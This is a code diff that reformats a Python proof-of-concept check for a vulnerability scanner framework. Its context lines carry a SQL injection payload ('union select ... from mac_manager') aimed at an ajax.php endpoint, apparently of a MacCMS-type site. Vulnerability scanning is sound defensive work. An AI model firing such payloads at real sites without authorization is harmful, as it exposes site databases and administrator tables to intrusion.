@@ -1,6 +1,8 @@
 # coding: utf-8
 
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.error
+import urllib.parse
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 
@@ -38,9 +40,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         vul_url = '%s/inc/ajax.php?ac=digg&ac2=&id=1&tab=vod+' % self.target
         payload = 'union+select/**/+null,md5(1231412414)+from+mac_manager+--%20'
         try:
